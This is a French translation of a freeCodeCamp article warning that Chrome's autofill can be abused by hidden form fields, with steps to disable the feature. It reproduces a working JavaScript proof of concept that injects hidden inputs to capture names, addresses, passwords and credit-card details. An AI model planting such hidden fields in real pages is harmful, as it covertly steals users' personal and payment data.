---
title: Pourquoi l'autocomplétion de Chrome est peu sécurisée et comment la désactiver
subtitle: ''
author: Quincy Larson
co_authors: []
series: null
date: '2017-01-12T17:43:10.000Z'
originalURL: https://freecodecamp.org/news/why-your-browsers-autocomplete-is-insecure-and-you-should-turn-it-off-ebc73d7bcefd
coverImage: https://cdn-media-1.freecodecamp.org/images/1*zlm2cNYCamoyiXgzF9yNVg.jpeg
tags:
- name: JavaScript
  slug: javascript
- name: Life lessons
  slug: life-lessons
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: Web Development
  slug: web-development
seo_title: Pourquoi l'autocomplétion de Chrome est peu sécurisée et comment la désactiver
seo_desc: 'Chrome has yet to fix a well-known vulnerability first publicized way back
  in 2013.

  Basically, a hacker can hide form input fields on a web page, which Chrome will
  then fill in with your personal information if you opt to use its autocomplete feature...'
---

Chrome n'a toujours pas corrigé une vulnérabilité bien connue [publiée pour la première fois en 2013](https://yoast.com/autocomplete-security/).

En gros, un pirate peut cacher des champs de saisie de formulaire sur une page web, que Chrome remplira ensuite avec vos informations personnelles si vous choisissez d'utiliser sa fonction d'autocomplétion.

Voici à quoi cela ressemble :

![Image](https://cdn-media-1.freecodecamp.org/images/oCfYvamWf4jPJKjaVbLjmPMyF5G4babpTCrB)
_gif par [anttiviljami](https://github.com/anttiviljami/browser-autofill-phishing/blob/master/readme.md" rel="noopener" target="_blank" title=")_

L'utilisateur GitHub [haampie](https://gist.githubusercontent.com/haampie/3ba6ebb5fd9f71d2f8e9fb841e52740d/raw/d2278671539ab5987a184603b0b3dd9942ba66e0/inject.js) a démontré cela avec le script JavaScript suivant :

```
var autocompletes = ['name', 'honorific-prefix', 'given-name',  'additional-name', 'family-name', 'honorific-suffix',  'nickname', 'username', 'new-password',  'current-password', 'organization-title', 'organization',  'street-address', 'address-line1', 'address-line2',  'address-line3', 'address-level4', 'address-level3',  'address-level2', 'address-level1', 'country',  'country-name', 'postal-code', 'cc-name', 'cc-given-name',  'cc-additional-name', 'cc-family-name', 'cc-exp',  'cc-exp-month', 'cc-exp-year', 'cc-csc', 'cc-type',  'transaction-currency', 'transaction-amount',  'language', 'bday', 'bday-day', 'bday-month',  'bday-year', 'sex', 'url', 'photo', 'tel',  'tel-country-code', 'tel-national',  'tel-area-code', 'tel-local', 'tel-local-prefix',  'tel-local-suffix', 'tel-extension', 'impp'];emailField.addEventListener('focus', function() {  var wrap = autocompletes.reduce(function(wrapper, field) {    var input = document.createElement('input');        // Les rendre non focalisables    input.tabIndex = -1;    input.autocomplete = field;        wrapper.appendChild(input);    return wrapper;  }, document.createElement('div'));  // Cacher le wrapper  wrap.classList.add('hidden');  form.appendChild(wrap);  // Injecter les autocomplétions une fois  this.removeEventListener('focus', arguments.callee);});
```

Je vous recommande de désactiver immédiatement la fonction d'autocomplétion de Chrome.

### La manière la plus rapide de désactiver l'autocomplétion dans Chrome

1. Collez ceci dans la barre d'adresse de Chrome : `chrome://settings/autofill`
2. Appuyez sur échap pour quitter la modale "gérer les paramètres de remplissage automatique"
3. Décochez la case de remplissage automatique

![Image](https://cdn-media-1.freecodecamp.org/images/LKF5tggP0hn7ORHckRNvohV42cj3SInMH0Ky)

Vous êtes maintenant prêt. Vous devrez peut-être taper un peu plus, mais vous aurez l'esprit tranquille en sachant que les pirates ne pourront pas voler vos données personnelles en utilisant cette faille bien connue.